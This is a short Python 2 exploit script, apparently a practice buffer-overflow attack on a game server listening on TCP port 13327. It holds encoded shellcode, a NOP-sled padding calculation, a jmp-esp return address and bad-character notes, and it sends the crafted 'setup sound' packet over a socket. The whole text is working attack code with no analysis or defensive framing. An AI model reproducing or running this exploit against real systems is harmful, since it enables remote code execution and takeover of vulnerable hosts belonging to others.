#!/usr/bin/env python2
import socket

host = "127.0.0.1"
#bad, \x00\x0a\x0d\x20
#jmp esp, 08134596
shellcode = ("\xda\xce\xd9\x74\x24\xf4\xbe\x23\x5d\x9e\x68\x5d\x31\xc9\xb1"
        "\x12\x83\xed\xfc\x31\x75\x13\x03\x56\x4e\x7c\x9d\xa9\xab\x77"
        "\xbd\x9a\x08\x2b\x28\x1e\x06\x2a\x1c\x78\xd5\x2d\xce\xdd\x55"
        "\x12\x3c\x5d\xdc\x14\x47\x35\x1f\x4e\xb6\xe2\xf7\x8d\xb9\xe5"
        "\x1a\x1b\x58\x45\x42\x4b\xca\xf6\x38\x68\x65\x19\xf3\xef\x27"
        "\xb1\x62\xdf\xb4\x29\x13\x30\x14\xcb\x8a\xc7\x89\x59\x1e\x51"
        "\xac\xed\xab\xac\xaf")
offset = 4368
overflow = 4379

crash = shellcode
crash += "\x90" * (offset - len(crash))
crash += "\x96\x45\x13\x08"
crash += "\x83\xc0\x0c\xff\xe0\x90\x90"

buffer = "\x11(setup sound " + crash + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s = socket.socket()
print "Sending buffer overflow..."
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "Done!"
